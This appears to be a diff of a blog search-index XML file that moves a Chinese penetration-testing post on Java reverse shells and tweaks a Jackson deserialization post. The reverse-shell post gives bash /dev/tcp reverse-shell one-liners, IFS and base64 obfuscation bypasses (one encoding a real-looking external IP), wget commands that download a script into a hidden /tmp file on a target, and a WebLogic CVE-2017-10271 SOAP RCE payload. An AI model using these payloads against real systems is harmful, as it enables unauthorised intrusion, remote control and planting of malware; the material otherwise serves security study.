@@ -3,6 +3,154 @@
   
     
     <entry>
+      <title><![CDATA[java反弹shell]]></title>
+      <url>/2020/01/13/Web%E6%B8%97%E9%80%8F/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BC%B9shell/</url>
+      <content type="html"><![CDATA[<h1 id="java-反弹shell"><a href="#java-反弹shell" class="headerlink" title="java 反弹shell"></a>java 反弹shell</h1><p>[TOC]</p>
+<p>在渗透测试中，偶尔会遇到目标为java环境下的RCE，其中java命令执行的函数比较常见的分为Runtime和Process的类。这里遇到的坑以及解决方法。</p>
+<h2 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h2><p>这里主要涉及 <code>Runtime.getRuntime().exec()</code><br>测试用例如下：</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span>  java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">;</span>
+<span class="token keyword">import</span>  java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Process<span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">exec</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">try</span><span class="token punctuation">{</span>
+            Runtime rt  <span class="token operator">=</span>   Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            String<span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"ping"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"th9bvw.ceye.io"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+            Process pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"11111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"2222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        exec e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<h3 id="管道符号"><a href="#管道符号" class="headerlink" title="管道符号"></a>管道符号</h3><p>在遇到对渗透目标执行重定向或者pipeline的时候，对应符号不会被解析，重定向或管道符号失效。解析如下：</p>
+<pre><code>ls /tmp/ | grep xx
+</code></pre><p>这个时候 该程序中管道符号被视为普通字符</p>
+<pre><code>ls &quot;/tmp&quot; &quot;|&quot; &quot;grep&quot; &quot;xx&quot;
+</code></pre><p>比如遇到以下环境：</p>
+<ul>
+<li>weblogic 漏洞 在执行weblogic RCE中，对其进行测试并使其载入远程服务器上面的木马时，需要满足条件如下：</li>
+<li>命令执行，载入下载程序并执行下载程序，在这个时候命令如下：</li>
+</ul>
+<pre><code>cmd = &quot;wget http://th9bvw.ceye.io/down_v2_1.sh -q -O /tmp/.font-unixx &amp;&amp; chmod +x /tmp/.font-unixx &amp;&quot;
+</code></pre><p>直接执行该命令，会发现&amp;&amp;后的语句并没有成功执行，这个时候就要执行以下方法了,以数组方法执行，详情参照<code>exec</code> 的重载</p>
+<h4 id="linux目标"><a href="#linux目标" class="headerlink" title="linux目标"></a>linux目标</h4><p>在linux下，常用方法（注意下，这里执行的时候，/bin/sh会以sh shell执行，/bin/bash会以bash执行，具体看怎么调用</p>
+<pre><code>String[] command = { &quot;/bin/sh&quot;, &quot;-c&quot;, cmds };
+Process ps = Runtime.getRuntime().exec(command );
+</code></pre><p><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15691675380880.jpg" alt=""><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15691675525950.jpg" alt=""></p>
+<pre><code>sh -c 作用说明:
+让调用的bash 将一个字符串作为完整的命令来执行
+</code></pre><p>常用反弹shell</p>
+<ul>
+<li><p>sh</p>
+<pre><code>/bin/bash -c &#39;sh -i &gt;&amp; /dev/tcp/127.0.0.1/9999 0&gt;&amp;1&#39;
+</code></pre><p><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706367303103.jpg" alt="-w331"></p>
+</li>
+<li><p>bash</p>
+<pre><code>/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/127.0.0.1/9999 0&gt;&amp;1&#39;
+</code></pre><p><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706367647957.jpg" alt="-w341"></p>
+</li>
+</ul>
+<p>这里备注下 OSX系统中存在多种shell<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706369208934.jpg" alt="-w562"><br>因为常用的shell 是zsh ，所以遇到多种情况有点坑，应该是环境变量没配好<br>如 以下命令：<br>在zsh中<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706370741721.jpg" alt="-w562"></p>
+<p>在bash中：<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706371257635.jpg" alt="-w531"></p>
+<p>在sh中:<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706371690653.jpg" alt="-w987"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706371954883.jpg" alt="-w901"></p>
+<h4 id="windows目标"><a href="#windows目标" class="headerlink" title="windows目标"></a>windows目标</h4><p>在windows下，常用方法</p>
+<pre><code>String[] command = { &quot;cmd&quot;, &quot;/c&quot;, cmds };
+Process ps = Runtime.getRuntime().exec(command );
+</code></pre><p>综上 即命令中涉及 <code>&lt;  &gt;  |  &amp;</code>等符号时<br><code>getRuntime().exec(String command )</code>此时已不适用，可以尝试<br><code>exec(String [] cmdArray) 
+ exec(String []cmdarray,String []envp,File dir)</code>来执行</p>
+<p> 但当遇到的命令执行的点是<code>getRuntime().exec(String command )</code>，此时这些绕过方法即不适用了。涉及到 <code>bypass exec</code> </p>
+<h2 id="bypass-exec"><a href="#bypass-exec" class="headerlink" title="bypass exec"></a>bypass exec</h2><h3 id="IFS"><a href="#IFS" class="headerlink" title="IFS"></a>IFS</h3><p>Shell 的环境变量分为 set, env 两种，其中 set 变量可以通过 export 工具导入到 env 变量中。其中，set 是显示设置shell变量，仅在本 shell 中有效；env 是显示设置用户环境变量 ，仅在当前会话中有效。换句话说，set 变量里包含了 env 变量，但 set 变量不一定都是 env 变量。这两种变量不同之处在于变量的作用域不同。显然，env 变量的作用域要大些，它可以在 subshell 中使用。</p>
+<pre><code> 而 IFS 是一种 set 变量，当 shell 处理&quot;命令替换&quot;和&quot;参数替换&quot;时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。
+</code></pre><p>————————————————<br>版权声明：本文为CSDN博主「whuslei」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/whuslei/article/details/7187639" target="_blank" rel="noopener">https://blog.csdn.net/whuslei/article/details/7187639</a></p>
+<p>查看其值<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704628317663.jpg" alt="-w308"></p>
+<p>“040”是空格，”011”是Tab，”012”是换行符”\n”<br>即简单来说 IFS可以替代 空格<br>在这里用来绕过尝试：<br>跟踪exec：<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629198309.jpg" alt="-w988"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629353562.jpg" alt="-w1065"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629504206.jpg" alt="-w1084"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629694526.jpg" alt="-w600"><br>这里可以明显看到 IFS起到了分隔符的作用<br>正常情况下<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706878745671.jpg" alt="-w430"><br>这样传入参数是可以执行的<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706884565379.jpg" alt="-w844"></p>
+<p><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706889154267.jpg" alt="-w1128"></p>
+<p>但是一个比较坑的事，在mac中bash 使用IFS没有反弹shell，但在centos中就可以使用,猜测是osx的环境变量有问题。<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704643120846.jpg" alt="-w960"></p>
+<p>经测试，改用osx的shell环境 可以执行</p>
+<pre><code>/bin/bash -c bash${IFS}-i${IFS}&gt;&amp;${IFS}/dev/tcp/127.0.0.1/8888&lt;&amp;1
+</code></pre><p>centos中的反应<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704643290042.jpg" alt="-w487"></p>
+<h3 id="命令执行base64编码"><a href="#命令执行base64编码" class="headerlink" title="命令执行base64编码"></a>命令执行base64编码</h3><p>在java反序列化中可能遇上反序列化命令执行中存在转义的现象，这个时候可以使用base64编码进行绕过</p>
+<pre><code>cmd = &quot;{echo,%s}|{base64,-d}|{bash,-i}&quot; %base64.b64encode(cmd)
+
+String[] commands = {&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjQuMTQ2LjIwNC84NTUwIDA+JjE=}|{base64,-d}|{bash,-i}&quot;}
+</code></pre><h4 id="反序列化示例"><a href="#反序列化示例" class="headerlink" title="反序列化示例"></a>反序列化示例</h4><h3 id="xml执行绕过"><a href="#xml执行绕过" class="headerlink" title="xml执行绕过"></a>xml执行绕过</h3><p>这里遇到在反序列化存在于xml中的时候，在用到管道符等时要用实体编码进行绕过处理</p>
+<h4 id="利用实例-CVE-2017-10271"><a href="#利用实例-CVE-2017-10271" class="headerlink" title="利用实例 CVE-2017-10271"></a>利用实例 CVE-2017-10271</h4><p>该漏洞利用poc如下：</p>
+<pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+      &lt;soapenv:Header&gt;
+        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+          &lt;java&gt;
+            &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
+              &lt;array class=&quot;java.lang.String&quot; length=&quot;2&quot;&gt;
+                &lt;void index=&quot;0&quot;&gt;
+                  &lt;string&gt;/bin/bash&lt;/string&gt;
+                &lt;/void&gt;
+                &lt;void index=&quot;1&quot;&gt;
+                  &lt;string&gt;-c&lt;/string&gt;
+                &lt;/void&gt;
+                &lt;void index=&quot;2&quot;&gt;
+                  &lt;string&gt;&#39;&#39;&#39;+cmd+&#39;&#39;&#39;&lt;/string&gt;
+                &lt;/void&gt;
+              &lt;/array&gt;
+              &lt;void method=&quot;start&quot;/&gt;
+            &lt;/void&gt;
+          &lt;/java&gt;
+        &lt;/work:WorkContext&gt;
+      &lt;/soapenv:Header&gt;
+      &lt;soapenv:Body/&gt;
+    &lt;/soapenv:Envelope&gt;
+</code></pre><p>其中在cmd中传入字符串的时候需要进行编码，否则会进行报错<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699933180870.jpg" alt="-w1437"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699934142704.jpg" alt="-w1437"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699937854703.jpg" alt="-w878"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699938012054.jpg" alt="-w513"></p>
+<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>wget http://th9bvw.ceye.io -o /tmp/.test12.sh <span class="token entity" title="&amp;">&amp;amp;</span><span class="token entity" title="&amp;">&amp;amp;</span>  chmod +x /tmp/.test12.sh<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>
+</code></pre>
+<p><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699981292782.jpg" alt="-w673"></p>
+<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><p>在测试中遇到在上传执行脚本时，发现系统上不存在wget、curl等命令，即无法直接通过shell 脚本进行云端下载请求，可以尝试使用Bash /dev/tcp 进行文件传输：</p>
+<p>通过 bash直接建立socket请求（待测试）</p>
+<pre class=" language-shell"><code class="language-shell">exec 8<>/dev/tcp/127.0.0.1/11211    
+#使用文件描述符8以<>(<读>写)方式，打开127.0.0.1的tcp11211端口
+ls -l /proc/self/fd                                   
+#查看打开的连接8
+echo -e "stats" >&8                             
+#向socket写入数据
+cat <&8                                                  
+#从socket读入数据
+exec 8<&-                                              
+#关闭socket读
+exec 8>&-                                              
+#关闭socket写
+</code></pre>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">编码转换</a><br><a href="https://paper.seebug.org/834/" target="_blank" rel="noopener">红队后渗透测试中的文件传输技巧</a></p>
+<p><a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/" target="_blank" rel="noopener">绕过exec获取反弹shell</a><br><a href="https://www.cnblogs.com/leixiao-/p/10216571.html" target="_blank" rel="noopener">bash扩展</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> web 渗透 </category>
+            
+            <category> java反序列化 </category>
+            
+            <category> java反弹shell </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> web 渗透 </tag>
+            
+            <tag> java反序列化 </tag>
+            
+            <tag> java反弹shell </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[jackson反序列化漏洞_1]]></title>
       <url>/2020/01/13/Web%E6%B8%97%E9%80%8F/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E_1/</url>
       <content type="html"><![CDATA[<h1 id="jackson反序列化漏洞-1"><a href="#jackson反序列化漏洞-1" class="headerlink" title="jackson反序列化漏洞_1"></a>jackson反序列化漏洞_1</h1><p>[TOC]</p>
@@ -51,17 +199,17 @@
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span>
 </code></pre>
-<h4 id="调用结果"><a href="#调用结果" class="headerlink" title="调用结果"></a>调用结果</h4><p><a href="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752623110024.jpg" data-fancybox="group" data-caption="-w1127" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752623110024.jpg" alt="-w1127" title="-w1127"></a></p>
+<h4 id="调用结果"><a href="#调用结果" class="headerlink" title="调用结果"></a>调用结果</h4><p><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752623110024.jpg" alt="-w1127"></p>
 <h3 id="漏洞复现说明"><a href="#漏洞复现说明" class="headerlink" title="漏洞复现说明"></a>漏洞复现说明</h3><p>根据该漏洞调试情况，表面上问题主要出在readvalue传入的参数可控，在该案例中，通过读取json文件中的需要转换为inner类的json数据，该json数据中调用<code>FileSystemXmlApplicationContext</code>读入xml中的bean数据，在该方法的调用中实现命令执行</p>
 <h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>【1】通过<code>FileSystemXmlApplicationContext</code>读取绝对路径时，得写上两个<code>\</code></p>
-<h3 id="漏洞跟踪"><a href="#漏洞跟踪" class="headerlink" title="漏洞跟踪"></a>漏洞跟踪</h3><p>【1】readvalue函数需要参数 byte[],转换的类对象<br><a href="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752631863029.jpg" data-fancybox="group" data-caption="-w998" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752631863029.jpg" alt="-w998" title="-w998"></a><br>【2】从接收的json字节流中创建解析对象<br><code>jsonfactory.creatParse</code>其中<code>src</code>为传入的字节流数据<br><a href="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752636355629.jpg" data-fancybox="group" data-caption="-w1121" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752636355629.jpg" alt="-w1121" title="-w1121"></a><br>传入要转换的java对象<br><a href="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752648786936.jpg" data-fancybox="group" data-caption="-w951" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752648786936.jpg" alt="-w951" title="-w951"></a></p>
-<p>【3】通过2构造readMapAndClose传入数据来调用解析json数据<br><a href="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752650611056.jpg" data-fancybox="group" data-caption="-w1190" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752650611056.jpg" alt="-w1190" title="-w1190"></a><br>传入的p0数据<br><a href="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752650176156.jpg" data-fancybox="group" data-caption="-w1064" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752650176156.jpg" alt="-w1064" title="-w1064"></a></p>
-<p>【4】反序列化json数据流<br><a href="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752651998120.jpg" data-fancybox="group" data-caption="-w1224" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752651998120.jpg" alt="-w1224" title="-w1224"></a></p>
-<p>…<br>…<br>object对象读入<br><code>deserializeFromString</code>-&gt;<code>createFromString</code>-&gt;<code>newInstance</code>-&gt;<br><code>loadBeanDefinitions</code>-&gt;<code>FileSystemXmlApplicationContext</code>-&gt;<code>refresh</code><br><a href="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752667685983.jpg" data-fancybox="group" data-caption="-w980" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752667685983.jpg" alt="-w980" title="-w980"></a></p>
+<h3 id="漏洞跟踪"><a href="#漏洞跟踪" class="headerlink" title="漏洞跟踪"></a>漏洞跟踪</h3><p>【1】readvalue函数需要参数 byte[],转换的类对象<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752631863029.jpg" alt="-w998"><br>【2】从接收的json字节流中创建解析对象<br><code>jsonfactory.creatParse</code>其中<code>src</code>为传入的字节流数据<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752636355629.jpg" alt="-w1121"><br>传入要转换的java对象<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752648786936.jpg" alt="-w951"></p>
+<p>【3】通过2构造readMapAndClose传入数据来调用解析json数据<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752650611056.jpg" alt="-w1190"><br>传入的p0数据<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752650176156.jpg" alt="-w1064"></p>
+<p>【4】反序列化json数据流<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752651998120.jpg" alt="-w1224"></p>
+<p>…<br>…<br>object对象读入<br><code>deserializeFromString</code>-&gt;<code>createFromString</code>-&gt;<code>newInstance</code>-&gt;<br><code>loadBeanDefinitions</code>-&gt;<code>FileSystemXmlApplicationContext</code>-&gt;<code>refresh</code><br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752667685983.jpg" alt="-w980"></p>
 <p><code>createFromString</code> ：读取json对象，读入xml文件内容<br><code>newInstance</code> ：调用<code>Class.forName</code>加载类 并实例化 即加载<br><code>org.springframework.context.support.FileSystemXmlApplicationContext</code> 实例处理xml文件中的内容</p>
-<p><code>FileSystemResource</code> 读取xml内容<br><code>loadBeanDefinitions</code>:读取xml内容字节流，输入字节流处理<br><code>refresh</code>函数进行xml初始化实例<br><a href="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752816212912.jpg" data-fancybox="group" data-caption="-w1040" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752816212912.jpg" alt="-w1040" title="-w1040"></a></p>
-<p><a href="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752813499215.jpg" data-fancybox="group" data-caption="-w523" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752813499215.jpg" alt="-w523" title="-w523"></a><br><a href="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752830381227.jpg" data-fancybox="group" data-caption="-w895" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752830381227.jpg" alt="-w895" title="-w895"></a></p>
-<p><a href="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752832744311.jpg" data-fancybox="group" data-caption="-w1018" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752832744311.jpg" alt="-w1018" title="-w1018"></a><br><a href="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752835566747.jpg" data-fancybox="group" data-caption="-w1035" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752835566747.jpg" alt="-w1035" title="-w1035"></a></p>
+<p><code>FileSystemResource</code> 读取xml内容<br><code>loadBeanDefinitions</code>:读取xml内容字节流，输入字节流处理<br><code>refresh</code>函数进行xml初始化实例<br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752816212912.jpg" alt="-w1040"></p>
+<p><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752813499215.jpg" alt="-w523"><br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752830381227.jpg" alt="-w895"></p>
+<p><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752832744311.jpg" alt="-w1018"><br><img src="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/15751936743604/15752835566747.jpg" alt="-w1035"></p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://chenergy1991.github.io/2019/03/24/CVE-2017-7275/" target="_blank" rel="noopener">CVE-2017-7275：Jackson-databind漏洞复现与分析笔记</a><br><a href="https://blog.csdn.net/u011499747/article/details/78762007" target="_blank" rel="noopener">Jackson之jackson-databind</a><br><a href="https://www.cnblogs.com/EasonJim/p/8449968.html" target="_blank" rel="noopener">Jackson工具类使用及配置指南、高性能配置（转）</a><br><a href="https://www.jianshu.com/p/de206c18ce08" target="_blank" rel="noopener">Java中newInstance()和new()</a></p>
 ]]></content>
       
@@ -83,150 +231,6 @@
             <tag> java反序列化 </tag>
             
             <tag> jackson </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[java反弹shell]]></title>
-      <url>/2020/01/13/Web%E6%B8%97%E9%80%8F/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BC%B9shell/</url>
-      <content type="html"><![CDATA[<h1 id="java-反弹shell"><a href="#java-反弹shell" class="headerlink" title="java 反弹shell"></a>java 反弹shell</h1><p>[TOC]</p>
-<p>在渗透测试中，偶尔会遇到目标为java环境下的RCE，其中java命令执行的函数比较常见的分为Runtime和Process的类。这里遇到的坑以及解决方法。</p>
-<h2 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h2><p>这里主要涉及 <code>Runtime.getRuntime().exec()</code><br>测试用例如下：</p>
-<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span>  java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">;</span>
-<span class="token keyword">import</span>  java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Process<span class="token punctuation">;</span>
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">exec</span> <span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token keyword">try</span><span class="token punctuation">{</span>
-            Runtime rt  <span class="token operator">=</span>   Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            String<span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"ping"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"th9bvw.ceye.io"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
-            Process pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"11111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>
-            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"2222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
-        exec e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<h3 id="管道符号"><a href="#管道符号" class="headerlink" title="管道符号"></a>管道符号</h3><p>在遇到对渗透目标执行重定向或者pipeline的时候，对应符号不会被解析，重定向或管道符号失效。解析如下：</p>
-<pre><code>ls /tmp/ | grep xx
-</code></pre><p>这个时候 该程序中管道符号被视为普通字符</p>
-<pre><code>ls &quot;/tmp&quot; &quot;|&quot; &quot;grep&quot; &quot;xx&quot;
-</code></pre><p>比如遇到以下环境：</p>
-<ul>
-<li>weblogic 漏洞 在执行weblogic RCE中，对其进行测试并使其载入远程服务器上面的木马时，需要满足条件如下：</li>
-<li>命令执行，载入下载程序并执行下载程序，在这个时候命令如下：</li>
-</ul>
-<pre><code>cmd = &quot;wget http://th9bvw.ceye.io/down_v2_1.sh -q -O /tmp/.font-unixx &amp;&amp; chmod +x /tmp/.font-unixx &amp;&quot;
-</code></pre><p>直接执行该命令，会发现&amp;&amp;后的语句并没有成功执行，这个时候就要执行以下方法了,以数组方法执行，详情参照<code>exec</code> 的重载</p>
-<h4 id="linux目标"><a href="#linux目标" class="headerlink" title="linux目标"></a>linux目标</h4><p>在linux下，常用方法（注意下，这里执行的时候，/bin/sh会以sh shell执行，/bin/bash会以bash执行，具体看怎么调用</p>
-<pre><code>String[] command = { &quot;/bin/sh&quot;, &quot;-c&quot;, cmds };
-Process ps = Runtime.getRuntime().exec(command );
